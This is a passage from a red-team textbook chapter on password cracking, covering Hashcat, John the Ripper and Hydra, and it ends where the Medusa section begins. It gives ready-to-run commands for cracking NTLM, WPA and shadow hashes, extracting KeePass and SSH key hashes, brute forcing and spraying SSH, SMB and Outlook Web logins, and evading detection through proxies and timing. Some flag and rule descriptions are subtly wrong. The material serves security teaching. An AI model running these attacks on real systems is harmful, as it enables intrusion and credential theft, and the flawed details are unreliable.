# Chapter 17: Password Cracking Tools

Password attacks remain one of the most reliable methods for gaining unauthorized access to systems and applications during red team operations. This chapter explores specialized tools for cracking passwords through both offline methods (against obtained password hashes) and online methods (against live authentication endpoints).

## Introduction to Password Attacks

Password cracking serves several critical functions in red team operations:

- **Credential verification**: Testing the strength of password policies
- **Lateral movement**: Using cracked credentials to expand access
- **Privilege escalation**: Accessing higher-privilege accounts with cracked passwords
- **Password pattern analysis**: Identifying organizational password trends
- **Data access**: Decrypting protected files and data with recovered passwords

Choosing the right tool for each scenario dramatically improves efficiency and success rates. This chapter covers five powerful tools that enable different aspects of password attacks.

## Hashcat: GPU-Accelerated Password Cracking

![Hashcat architecture showing GPU acceleration pipeline](./images/hashcat_architecture.png)
*Figure 17.1: Hashcat architecture showing GPU acceleration pipeline*

### Introduction to Hashcat

Hashcat stands as the most powerful and versatile password recovery tool available to security professionals. Created by atom (Jens Steube) and now maintained as an open-source project, Hashcat leverages modern GPU acceleration to achieve unprecedented password cracking speeds. For red teamers, Hashcat represents the primary tool for credential analysis and recovery after obtaining password hashes during engagements.

This section focuses on advanced Hashcat usage for red team operations, assuming you've already installed the tool. Both Kali and Parrot distributions include Hashcat pre-installed, though for optimal performance, you may want to install the latest version directly from the official repository.

### Understanding Hashcat's Architecture

Hashcat's power comes from its efficient utilization of GPU processing capabilities, which provides orders of magnitude faster cracking speeds compared to CPU-only tools. The architecture consists of several key components:

1. **Core Engine** - Manages workload distribution and processing
2. **Hash Parser** - Identifies and prepares hash formats for cracking
3. **Kernel Engine** - Executes optimized code on GPUs/CPUs
4. **Rule Engine** - Applies transformations to wordlists
5. **Mask Processor** - Manages brute force attack patterns
6. **Output Formatter** - Processes and displays results

#### Supported Hardware Acceleration

```bash
# Check available OpenCL platforms and devices
hashcat --opencl-info

# Check CUDA support
hashcat --backend-info
```

Hashcat supports multiple acceleration backends:
- OpenCL (AMD, Intel, NVIDIA)
- CUDA (NVIDIA)

### Basic Hashcat Command Structure

The general syntax for Hashcat commands follows this pattern:

```bash
hashcat [options] hash_file wordlist_file
```

#### Key Parameters

| Parameter | Description | Example |
|-----------|-------------|---------|
| `-m` | Hash type | `-m 1000` for NTLM |
| `-a` | Attack mode | `-a 0` for dictionary attack |
| `-o` | Output file | `-o cracked.txt` |
| `--force` | Ignore warnings | `--force` |
| `--show` | Show already cracked | `--show` |
| `--potfile-disable` | Don't write to pot file | `--potfile-disable` |
| `--runtime` | Set max runtime | `--runtime=3600` (1 hour) |

#### Example Basic Command

```bash
# Crack MD5 hashes with dictionary attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt
```

### Hash Types and Identification

Hashcat supports over 300 hash types. Selecting the correct hash type is crucial for successful cracking.

#### Common Hash Types

| Hash Type | ID | Example |
|-----------|-------|---------|
| MD5 | 0 | 5f4dcc3b5aa765d61d8327deb882cf99 |
| SHA1 | 100 | 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 |
| SHA-256 | 1400 | 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 |
| SHA-512 | 1700 | b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 |
| NTLM | 1000 | b4b9b02e6f09a9bd760f388b67351e2b |
| NetNTLMv1 | 5500 | u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c |
| NetNTLMv2 | 5600 | admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 |
| WPA-EAPOL | 2500 | WPA*01*4d4fe7aac3a2cecab195321ceb99a7d0*fc690c158264*f4747f87f9f4*686173686361742d6573736964***  |
| Kerberos 5 TGS-REP | 13100 | $krb5tgs$23$*user$realm$test/spn*$b548e10f5694ae018d7ad63c257af7dc$35e8e45f... |

```bash
# Identify hash types using hashid (separate tool)
hashid -m 5f4dcc3b5aa765d61d8327deb882cf99

# Use hashcat's built-in example hashes for reference
hashcat --example-hashes | grep -A 2 -B 2 "NTLM"
```

### Attack Modes in Depth

Hashcat provides multiple attack strategies, each suitable for different scenarios.

#### Dictionary Attack (Mode 0)

The most basic attack using a wordlist:

```bash
# Simple dictionary attack
hashcat -m 1000 -a 0 hashes.txt wordlist.txt

# Use multiple wordlists
hashcat -m 1000 -a 0 hashes.txt wordlist1.txt wordlist2.txt
```

#### Combination Attack (Mode 1)

Combines words from multiple wordlists:

```bash
# Combine words from two lists
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```

This attack takes each word from the first wordlist and appends each word from the second wordlist, creating combinations like:
- password + 123
- password + admin
- letmein + 123
- letmein + admin

#### Mask Attack (Mode 3)

Brute force with flexible patterns:

```bash
# 8-character lowercase
hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# 8-character with mixed character sets
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?d?d
```

**Character Set Placeholders:**

| Placeholder | Character Set | Example |
|-------------|--------------|---------|
| `?l` | Lowercase | abcdefghijklmnopqrstuvwxyz |
| `?u` | Uppercase | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `?d` | Digits | 0123456789 |
| `?s` | Special | !"#$%&'()*+,-./:;<=>?@[\]^_`{}\|~ |
| `?a` | All | ?l?u?d?s |
| `?h` | Hex lowercase | 0123456789abcdef |
| `?H` | Hex uppercase | 0123456789ABCDEF |

**Complex Mask Examples:**

```bash
# Corporate password policy: 1 uppercase, 6 lowercase, 1 digit
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?l?l?d

# Year variations
hashcat -m 1000 -a 3 hashes.txt ?l?l?l?l?l?l2023

# Custom character sets
hashcat -m 1000 -a 3 hashes.txt -1 ?u?d ?1?1?1?1?1?1?1?1

# Incrementing mask length (1-8 characters)
hashcat -m 1000 -a 3 --increment --increment-min 1 --increment-max 8 hashes.txt ?a?a?a?a?a?a?a?a
```

#### Hybrid Attack (Modes 6 and 7)

Combines dictionary words with masks:

```bash
# Dictionary + Mask (Mode 6)
hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d?d?d

# Mask + Dictionary (Mode 7)
hashcat -m 1000 -a 7 hashes.txt ?d?d?d?d wordlist.txt
```

Mode 6 will append the mask pattern to each dictionary word, while Mode 7 prepends the mask pattern.

#### Rule-Based Attack

Rules transform dictionary words, drastically increasing coverage:

```bash
# Use built-in rules
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Stack multiple rule files
hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r rule1.rule -r rule2.rule
```

**Built-in Rule Files:**

| Rule File | Purpose | Complexity |
|-----------|---------|------------|
| `best64.rule` | Best 64 rules for general cracking | Low |
| `rockyou-30000.rule` | Rules generated from RockYou analysis | Medium |
| `OneRuleToRuleThemAll.rule` | Comprehensive rule set | Very High |
| `toggles.rule` | Case permutation | Medium |
| `leetspeak.rule` | Common letter-to-number substitutions | Medium |
| `dive.rule` | Deep/extensive transformations | Very High |

> **PRACTICAL TIP:**
> 
> For efficient password cracking, use a tiered approach:
> 
> 1. Start with a small wordlist and best64.rule
> 2. Try common passwords with OneRuleToRuleThemAll.rule
> 3. Proceed to targeted mask attacks based on password policy
> 4. Use large wordlists with extensive rules only as a last resort
> 
> This approach maximizes the chance of quick wins while conserving computational resources.

### Custom Rule Development

Rules transform passwords using a simple syntax. Here's a guide to creating custom rules:

#### Basic Rule Syntax

| Function | Description | Example | Input → Output |
|----------|-------------|---------|---------------|
| `:` | Do nothing | `:` | password → password |
| `l` | Convert to lowercase | `l` | PaSsWoRd → password |
| `u` | Convert to uppercase | `u` | password → PASSWORD |
| `c` | Capitalize | `c` | password → Password |
| `C` | Lowercase first, uppercase rest | `C` | password → pASSWORD |
| `t` | Toggle case | `t` | password → Password |
| `T` | Toggle at position N | `T3` | password → pasWord |
| `r` | Reverse | `r` | password → drowssap |
| `d` | Duplicate | `d` | password → passwordpassword |
| `p` | Prepend character | `p$` | password → $password |
| `a` | Append character | `a1` | password → password1 |
| `i` | Insert character at position | `i5!` | password → passw!ord |
| `o` | Overwrite character at position | `o3$` | password → pas$word |
| `s` | Substitute | `ss$` | password → pa$$word |
| `@` | Purge all instances of character | `@a` | password → pssword |
| `z` | Duplicate first character | `z` | password → ppassword |
| `Z` | Duplicate last character | `Z` | password → passwordd |
| `q` | Duplicate all characters | `q` | password → ppaasssswwoorrdd |
| `{` | Rotate left | `{` | password → asswordp |
| `}` | Rotate right | `}` | password → dpasswor |

### Real-World Attack Scenarios

Let's examine several real-world scenarios and the optimal Hashcat approaches for each.

#### Scenario 1: Windows Domain Controller Credential Dump

After successfully extracting NTLM hashes from a domain controller, you need to recover passwords for lateral movement:

```bash
# Step 1: Try common enterprise passwords
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Step 2: Target patterns based on company info
echo "CompanyName" > company_info.txt
echo "Est1985" >> company_info.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt company_info.txt -r /usr/share/hashcat/rules/dive.rule

# Step 3: Check for seasonally updated passwords
hashcat -m 1000 -a 0 ntlm_hashes.txt -r /usr/share/hashcat/rules/toggles.rule --increment --increment-min 1 --increment-max 3 ?u?l?l?l?l?l?d?d

# Step 4: Check for passwords matching known policy (1 uppercase, 6+ lowercase, 1+ digit)
hashcat -m 1000 -a 3 ntlm_hashes.txt ?u?l?l?l?l?l?l?d
hashcat -m 1000 -a 3 ntlm_hashes.txt ?u?l?l?l?l?l?l?l?d
```

![Hashcat NTLM Hash Attack Workflow](./images/hashcat_ntlm_workflow.png)
*Figure 17.2: NTLM Hash Attack Workflow Showing Strategy Progression*

#### Scenario 2: Web Application Database Dump

You've obtained SHA-256 password hashes from a web application database:

```bash
# Step 1: Try common passwords with rules
hashcat -m 1400 -a 0 webapp_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Step 2: Hybrid attack targeting common patterns
hashcat -m 1400 -a 6 webapp_hashes.txt /usr/share/wordlists/rockyou.txt ?d?d?d?d

# Step 3: Check for common leetspeak variations
hashcat -m 1400 -a 0 webapp_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/leetspeak.rule
```

#### Scenario 3: WPA Handshake Capture

After capturing a WPA handshake during a wireless assessment:

```bash
# Convert capture to Hashcat format
aircrack-ng -j wpa_handshake wpa_capture.cap

# Basic dictionary attack
hashcat -m 2500 -a 0 wpa_handshake.hccapx /usr/share/wordlists/rockyou.txt

# Common variants of SSID name
echo "CompanyWifi" > ssid.txt
echo "GuestAccess" >> ssid.txt
hashcat -m 2500 -a 0 wpa_handshake.hccapx ssid.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule

# Target 8-digit numeric PIN (common for default routers)
hashcat -m 2500 -a 3 wpa_handshake.hccapx ?d?d?d?d?d?d?d?d
```

> **CASE STUDY: Enterprise Password Analysis**
> 
> In a 2022 red team engagement for a financial services company, our team obtained NTLM hashes for 1,258 user accounts from a domain controller. Using Hashcat and the methodology below, we recovered 734 passwords (58%) within 24 hours:
> 
> 1. Common password pattern analysis revealed that 46% of recovered passwords followed the pattern: Capital letter + 5-7 lowercase letters + 2-4 digits
> 2. 23% contained the company name or variations
> 3. 15% included the current or previous quarter (Q1, Q2, etc.)
> 4. 8% used simple character substitutions (e → 3, a → @, etc.)
> 
> This enabled us to create highly targeted rules that recovered an additional 187 passwords, bringing the total to 73%. The engagement highlighted how even organizations with "strong" password policies remain vulnerable to well-tuned password cracking methods.
> 
> *Source: Anonymized real-world red team engagement, 2022*

### Optimizing Performance

Hashcat performance depends on hardware, configuration, and attack efficiency.

#### Hardware Optimization

```bash
# Show benchmark for all hash types
hashcat -b

# Benchmark specific hash type
hashcat -b -m 1000

# Optimize workload profile (default is 2)
hashcat -m 1000 -a 0 -w 3 hashes.txt wordlist.txt

# Use multiple devices
hashcat -m 1000 -a 0 -d 1,2 hashes.txt wordlist.txt
```

**Workload Profiles:**

| Profile | Description | Use Case |
|---------|-------------|----------|
| 1 | Low | Interactive desktop usage |
| 2 | Default | Balanced performance |
| 3 | High | Dedicated cracking machine |
| 4 | Nightmare | Maximum performance, system may become unresponsive |

### Advanced Features

#### Brain Client/Server

Hashcat Brain allows distributed cracking with de-duplication:

```bash
# Start the Brain server
hashcat --brain-server --brain-host=192.168.1.100 --brain-port=13743 --brain-password=secret

# Connect clients to the Brain
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a --brain-client --brain-host=192.168.1.100 --brain-port=13743 --brain-password=secret
```

#### Loopback Attack

The loopback attack uses already cracked passwords to find more:

```bash
# Run a loopback attack with rules
hashcat -m 1000 -a 0 hashes.txt cracked.txt -r best64.rule --loopback
```

Hashcat represents the state-of-the-art in password recovery tools, offering unparalleled flexibility, performance, and capability. For red teamers, mastering Hashcat is essential for effective credential assessment and recovery during engagements.

## John the Ripper: Versatile Password Cracker

![John the Ripper architecture diagram](./images/john_architecture.png)
*Figure 17.3: John the Ripper's component architecture showing processing pipeline*

### Introduction to John the Ripper

John the Ripper (JtR) stands as one of the most established and versatile password cracking tools available to security professionals. Created by Alexander Peslyak (Solar Designer) in 1996, John has evolved into a comprehensive toolkit that supports virtually every hash type encountered in modern systems. While Hashcat excels at GPU-accelerated attacks, John the Ripper often shines in specialized scenarios, format support, and auxiliary functionality.

For red teamers, John the Ripper serves as a complementary tool to Hashcat, offering different strengths and approaches to password recovery. This section focuses on advanced John usage, particularly in scenarios where it may outperform other cracking tools.

### Key Advantages of John the Ripper

1. **Format Support** - Handles numerous password hash formats, including many not supported by other tools
2. **Auto-Detection** - Can often identify hash types automatically
3. **Built-in Hash Extraction** - Can extract hashes directly from many file formats
4. **CPU Optimization** - Highly optimized for CPU cracking with SIMD instructions
5. **Community Jumbo Version** - Extended functionality through community contributions

### Basic Usage Patterns

The general syntax for John commands is:

```bash
john [options] [password-files]
```

#### Identifying Hash Types

Unlike Hashcat, John often automatically detects hash types:

```bash
# Let John automatically detect hash type
john hashes.txt

# Force specific hash format
john --format=raw-md5 hashes.txt

# List supported formats
john --list=formats
```

#### Core Attack Modes

```bash
# Basic wordlist attack
john --wordlist=wordlist.txt hashes.txt

# Wordlist with rules
john --wordlist=wordlist.txt --rules hashes.txt

# Incremental (brute force) attack
john --incremental hashes.txt

# Incremental with specific character set
john --incremental=digits hashes.txt
```

### Hash Extraction and Conversion

One of John's standout features is its ability to extract hashes directly from various file formats.

#### Unix Password Files

```bash
# Crack shadow file directly
john /etc/shadow

# Extract hashes from shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

#### Windows Password Files

```bash
# Crack Windows NTLM hashes
john --format=nt windows_hashes.txt

# Convert Windows registry files to John format
pwdump system.hive sam.hive > sam.txt
john sam.txt
```

#### Application-Specific Formats

```bash
# Extract hashes from a ZIP file
zip2john protected.zip > zip_hash.txt
john zip_hash.txt

# Extract hashes from PDF files
pdf2john document.pdf > pdf_hash.txt
john pdf_hash.txt

# Extract hashes from KeePass database
keepass2john database.kdbx > keepass_hash.txt
john keepass_hash.txt

# Extract hashes from SSH private key
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt
```

![John's hash extraction workflow](./images/john_extraction_workflow.png)
*Figure 17.4: John's hash extraction workflow for various file formats*

### Configuration and Customization

John is highly configurable through its configuration file (`john.conf` or `john.ini`).

#### Locating and Modifying the Config File

```bash
# Find John's config file
john --list=build-info | grep "Config file"

# Common locations
# /etc/john/john.conf (system-wide)
# ~/.john/john.conf (user-specific)
```

#### Custom Rule Sets

John's rule syntax differs from Hashcat. Here's how to create custom rules:

```
# Add to john.conf under [List.Rules:YourRuleName]
# Common transformations
[List.Rules:Corporate]
# Append digits
$1
$2
$3
$1$2$3

# Common substitutions
c so0 si1 se3 sa@

# Capitalization variations
c
cC
C

# Year append
$2$0$2$3
$2$0$2$4
```

Use your custom rule:

```bash
john --wordlist=wordlist.txt --rules=Corporate hashes.txt
```

#### Session Management

```bash
# Start a named session
john --session=corporate hashes.txt

# Resume a session
john --restore=corporate

# Show progress
john --status=corporate

# Show cracked passwords
john --show hashes.txt
```

### Advanced Features

#### Distributed Cracking with MPI

```bash
# Install MPI support
apt install libopenmpi-dev
./configure --enable-mpi && make

# Run John with MPI (across multiple machines)
mpirun -np 4 -host node1,node2 john --wordlist=wordlist.txt hashes.txt
```

#### External Mode (Custom Functions)

John's External mode allows defining custom C-like functions for password generation:

```
# Add to john.conf
[List.External:Append2Digits]
void init()
{
    word[0] = 0;
}

void generate()
{
    int i;
    if (!word[0])
        word[0] = 'a' - 1;
    i = 0;
    while (word[i]) i++;
    i--;
    if (++word[i] > 'z')
    {
        word[i] = 'a';
        if (i)
            word[i-1]++;
        else
            return;
    }
    word[i+1] = '0';
    word[i+2] = '0';
    word[i+3] = 0;
}

int filter()
{
    int i = 0;
    while (word[i]) i++;
    i -= 2;
    word[i]++;
    if (word[i] > '9')
    {
        word[i] = '0';
        word[i-1]++;
    }
    return 1;
}
```

Use the external mode:

```bash
john --external=Append2Digits hashes.txt
```

#### Markov Mode

Markov mode prioritizes password candidates based on character sequence probabilities:

```bash
# Generate Markov stats from password list
john --markov --makechars=markov.stats password_list.txt

# Use Markov mode with custom stats
john --markov=markov.stats hashes.txt

# Limit Markov mode
john --markov=markov.stats:0:0:10000 hashes.txt
```

#### Single Crack Mode

This mode uses login names and GECOS information to generate password candidates:

```bash
# Run single crack mode
john --single hashes.txt

# Provide additional information for single mode
echo "john:AZ98tyCGwFmnh5:1000:1000:John Smith,Room 1234,925-555-1234:/home/john:/bin/bash" > extra_info.txt
john --single extra_info.txt
```

### Real-World Scenarios

#### Scenario 1: Cracking Password-Protected Archives

```bash
# Extract hash from ZIP file
zip2john confidential.zip > zip_hash.txt

# Check hash format
cat zip_hash.txt

# Crack the password
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

# Show the cracked password
john --show zip_hash.txt
```

#### Scenario 2: Extracting and Cracking Linux Shadow Hashes

```bash
# Combine passwd and shadow
unshadow /etc/passwd /etc/shadow > linux_hashes.txt

# Target specific users
grep "admin\|root" linux_hashes.txt > privileged_hashes.txt

# Crack with targeted rules
john --wordlist=company_terms.txt --rules=Corporate privileged_hashes.txt

# Use incremental mode for remaining hashes
john --incremental privileged_hashes.txt
```

#### Scenario 3: SSH Private Key Password Recovery

```bash
# Extract hash from SSH key
ssh2john id_rsa > id_rsa.hash

# Crack with focused wordlist
john --wordlist=personal_info.txt id_rsa.hash

# Try with rules if simple wordlist fails
john --wordlist=personal_info.txt --rules id_rsa.hash
```

> **CASE STUDY: Corporate Red Team Assessment (2021)**
> 
> During a red team assessment of a financial institution, our team obtained backup files from an administrator's workstation. Among these was a KeePass database (.kdbx file) containing credentials for multiple critical systems. Using John the Ripper's specialized `keepass2john` utility, we extracted the hash and discovered the master password was based on the administrator's daughter's name with common modifications.
> 
> ```bash
> keepass2john credentials.kdbx > keepass.hash
> john --wordlist=names.txt --rules keepass.hash
> ```
> 
> The password was discovered to be "Samantha2021#", a variant of his daughter's name with the current year and a special character. This allowed access to numerous production system credentials stored in the KeePass database.
> 
> The assessment highlighted the importance of proper enterprise password management and the risks of personal information being used in password creation.
> 
> *Source: Sanitized red team assessment report, 2021*

### Unique Features of John the Ripper

Several features make John stand out from other cracking tools:

#### Automatic Cracking (--Auto)

```bash
# Let John decide the best approach
john --auto hashes.txt
```

#### Loopback Mode

Similar to Hashcat's loopback, this uses already cracked passwords as input:

```bash
# Use previously cracked passwords as wordlist
john --loopback hashes.txt

# Combine with rules
john --loopback --rules hashes.txt
```

#### Word Mangling Rules

John's rule system allows sophisticated transformations:

```bash
# Apply default rules
john --wordlist=wordlist.txt --rules hashes.txt

# Use specific ruleset
john --wordlist=wordlist.txt --rules=Jumbo hashes.txt

# Stack multiple rulesets
john --wordlist=wordlist.txt --rules=Jumbo --rules=Corporate hashes.txt
```

John the Ripper remains an essential tool in the password cracking arsenal, complementing GPU-accelerated tools like Hashcat with its unique features and versatility. Its strengths in automatic hash identification, built-in hash extraction utilities, and handling of specialized formats make it particularly valuable for red team operations.

## Hydra: Online Password Attack Specialist

![Hydra architecture diagram](./images/hydra_architecture.png)
*Figure 17.5: Hydra's parallel processing architecture for online password attacks*

### Introduction to Hydra

THC-Hydra, commonly referred to simply as Hydra, is the preeminent tool for online password attacks and credential testing. Created by van Hauser of The Hacker's Choice (THC), Hydra stands out for its speed, parallelism, and support for a vast array of protocols. Unlike Hashcat and John the Ripper which crack password hashes offline, Hydra attacks live services directly, making it essential for red team operations that require access to running systems.

This section focuses on Hydra's advanced capabilities, deployment strategies, and operational security considerations when performing online attacks.

### Key Features of Hydra

1. **Multi-Protocol Support** - Attacks dozens of different authentication protocols
2. **Parallelism** - Tests multiple passwords simultaneously
3. **Modularity** - Extensible architecture for new protocols
4. **Authentication Flexibility** - Supports various authentication mechanisms
5. **Rate Limiting** - Controls request frequency to avoid detection

### Basic Usage Patterns

The general syntax for Hydra commands is:

```bash
hydra [options] target [protocol-specific-options]
```

#### Target Specification

```bash
# Single target
hydra 192.168.1.100 ssh

# Multiple targets
hydra -M targets.txt ssh

# Target with non-standard port
hydra 192.168.1.100 -s 2222 ssh

# IPv6 target
hydra -6 2001:db8::1 ssh
```

#### Credential Specification

```bash
# Single username, wordlist for passwords
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh

# Username list, single password
hydra -L users.txt -p Password123 192.168.1.100 ssh

# Lists for both username and password
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh

# Colon-separated credential pairs
hydra -C credentials.txt 192.168.1.100 ssh
```

### Supported Protocols and Services

Hydra supports a wide range of protocols, including:

| Protocol | Module Name | Default Port | Example |
|----------|-------------|--------------|---------|
| SSH | ssh | 22 | `hydra -l root -P pass.txt target ssh` |
| FTP | ftp | 21 | `hydra -l admin -P pass.txt target ftp` |
| HTTP(S) Basic Auth | http-get | 80/443 | `hydra -l admin -P pass.txt target http-get /admin/` |
| HTTP(S) Form Post | http-post-form | 80/443 | `hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:failed"` |
| SMB/CIFS | smb | 445 | `hydra -l administrator -P pass.txt target smb` |
| RDP | rdp | 3389 | `hydra -l administrator -P pass.txt target rdp` |
| MySQL | mysql | 3306 | `hydra -l root -P pass.txt target mysql` |
| PostgreSQL | postgres | 5432 | `hydra -l postgres -P pass.txt target postgres` |
| SMTP | smtp | 25 | `hydra -l user@example.com -P pass.txt target smtp` |
| POP3 | pop3 | 110 | `hydra -l user -P pass.txt target pop3` |
| IMAP | imap | 143 | `hydra -l user -P pass.txt target imap` |
| LDAP | ldap | 389 | `hydra -l "cn=admin,dc=example,dc=com" -P pass.txt target ldap` |
| VNC | vnc | 5900 | `hydra -P pass.txt target vnc` |
| Telnet | telnet | 23 | `hydra -l root -P pass.txt target telnet` |
| Cisco | cisco | 23 | `hydra -l admin -P pass.txt target cisco` |
| Cisco-enable | cisco-enable | 23 | `hydra -l admin -P pass.txt target cisco-enable` |
| SMB with Hash | smb | 445 | `hydra -l administrator -P pass.txt target smb` |

### Advanced Protocol-Specific Options

#### Web Form Attacks

HTTP form attacks require special attention due to their complexity:

```bash
# Basic HTTP POST form attack
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# With additional parameters
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^&csrf=1234:Login failed:H=Cookie: session=1234"

# HTTP GET form
hydra -l admin -P passwords.txt 192.168.1.100 http-get-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# HTTPS form with custom port
hydra -l admin -P passwords.txt 192.168.1.100 -s 8443 https-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

The HTTP form syntax follows this structure:
```
"path:form_parameters:failed_string:H=Optional_Header"
```

- `path`: The URL path to the login form
- `form_parameters`: Form data with `^USER^` and `^PASS^` placeholders
- `failed_string`: Text indicating login failure
- `H=Optional_Header`: Additional HTTP headers if needed

### Evasion Techniques

Online password attacks risk detection. These techniques help minimize detection:

#### Rate Limiting and Timing

```bash
# Slow attack with wait time
hydra -l admin -P passwords.txt -c 15 192.168.1.100 ssh

# Random timing between attempts
hydra -l admin -P passwords.txt -c 5:15 192.168.1.100 ssh
```

#### Proxy and Routing

```bash
# Route through SOCKS proxy
hydra -l admin -P passwords.txt -s 22 192.168.1.100 ssh -x 4:127.0.0.1:9050

# Route through HTTP proxy
hydra -l admin -P passwords.txt -s 22 192.168.1.100 ssh -x 3:127.0.0.1:8080
```

#### Custom User Agent

```bash
# Set custom User-Agent for web attacks
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed:H=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

#### IP Rotation (with external tools)

```bash
# Using multiple proxies via ProxyChains
proxychains hydra -l admin -P passwords.txt 192.168.1.100 ssh

# Using a distributed setup across multiple machines
# Machine 1
hydra -l admin -P passwords.txt -M targets_1.txt ssh

# Machine 2
hydra -l admin -P passwords.txt -M targets_2.txt ssh
```

### Real-World Attack Scenarios

#### Scenario 1: Corporate Portal Credential Testing

```bash
# Step 1: Identify the login form (manually or with tools)
firefox https://portal.company.com/login

# Step 2: Analyze the form submission (using browser dev tools)
# Form data: username=admin&password=pass&csrf_token=abc123

# Step 3: Extract a valid CSRF token
curl -s https://portal.company.com/login | grep -o 'csrf_token" value="[^"]*' | cut -d'"' -f3

# Step 4: Create the Hydra command with the token and proper failure message
hydra -l admin@company.com -P targeted_wordlist.txt 192.168.1.100 https-post-form "/login:username=^USER^&password=^PASS^&csrf_token=abc123:Invalid username or password:H=Cookie: session=xyz123"

# Step 5: Slow the attack to avoid detection
hydra -l admin@company.com -P targeted_wordlist.txt -t 1 -c 10 192.168.1.100 https-post-form "/login:username=^USER^&password=^PASS^&csrf_token=abc123:Invalid username or password:H=Cookie: session=xyz123"
```

#### Scenario 2: Internal Network SSH Access

```bash
# Step 1: Generate a list of potential usernames from OSINT
cat first_names.txt last_names.txt > users.txt

# Step 2: Create username variations based on company email format
sed -e 's/\(.*\)/\1/' -e 's/\(.*\)/\1.last/' -e 's/\(.*\)/\1_last/' users.txt > formatted_users.txt

# Step 3: Perform a controlled SSH attack
hydra -L formatted_users.txt -P company_specific.txt -t 4 -f 192.168.1.100 ssh

# Step 4: Use the successful credential to target other systems
for ip in $(cat internal_servers.txt); do
    hydra -l found_username -p found_password $ip ssh
done
```

#### Scenario 3: Password Spraying Against Multiple Services

```bash
# Step 1: Create a list of common but non-lockout-triggering passwords
echo "Spring2023!" > common_passes.txt
echo "Winter2023!" >> common_passes.txt
echo "Company2023!" >> common_passes.txt

# Step 2: Create a list of usernames from company directory
# (obtained through OSINT or previous access)

# Step 3: Perform slow password spraying across services
hydra -L users.txt -P common_passes.txt -t 1 -c 30 192.168.1.100 smb
hydra -L users.txt -P common_passes.txt -t 1 -c 30 192.168.1.100 http-post-form "/owa/auth.owa:username=^USER^&password=^PASS^&destination=https://mail.company.com/owa:Authentication failed"
```

![Hydra optimization workflow](./images/hydra_optimization.png)
*Figure 17.6: Balancing performance with detection avoidance in Hydra attacks*

> **CASE STUDY: Password Spraying Attack Against a Healthcare Provider**
> 
> In a 2022 red team engagement for a healthcare organization, we identified that employee accounts were being created with predictable default passwords following a pattern of "Company" + [Current Season] + [Current Year] + "!". 
> 
> Using Hydra with a small, highly targeted password list (just 4 passwords), we performed a controlled password spray across the organization's Outlook Web Access portal, discovering that approximately 22% of accounts still used these default credentials. The attack was executed with significant timing delays (45 seconds between attempts) to avoid triggering account lockouts:
> 
> ```bash
> hydra -L employee_list.txt -p "CompanySpring2022!" -t 1 -c 45 mail.healthcare.org https-post-form "/owa/auth/logon.aspx:username=^USER^&password=^PASS^:Login failed"
> ```
> 
> The success rate of this attack demonstrated the critical importance of enforcing password changes after initial account setup and implementing multi-factor authentication.
> 
> *Source: Anonymized red team assessment report, 2022*

### Operational Security Considerations

Online password attacks carry significant risk of detection and account lockouts. Consider these operational security measures:

#### Account Lockout Prevention

```bash
# Use very small password lists
hydra -l admin -P top10_passwords.txt 192.168.1.100 ssh

# Attack multiple accounts with one password at a time
hydra -L users.txt -p "Spring2023!" 192.168.1.100 smtp

# Add significant delays
hydra -l admin -P small_list.txt -t 1 -c 60 192.168.1.100 ssh
```

#### Distributed Attack Coordination

```bash
# Split password list
split -l 100 passwords.txt split_pw_

# Run from different machines/IPs with different segments
# Machine 1
hydra -l admin -P split_pw_aa 192.168.1.100 ssh

# Machine 2
hydra -l admin -P split_pw_ab 192.168.1.100 ssh
```

#### Session Management

```bash
# Create a restorable session
hydra -R -l admin -P passwords.txt 192.168.1.100 ssh

# Restore the previous session
hydra -I 192.168.1.100 ssh
```

Hydra remains the premier tool for online password attacks, providing red teamers with a powerful means of testing and validating credential security across a wide range of services. Its flexibility, protocol support, and performance make it indispensable for authorized security assessments.

## Medusa: Parallel Brute Forcing

Medusa is a speedy, massively parallel login brute-forcer that supports numerous protocols. While similar to Hydra, Medusa focuses on parallelism and modular design, making it particularly effective for high-performance brute force attacks.

### Installation

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install medusa

# From source
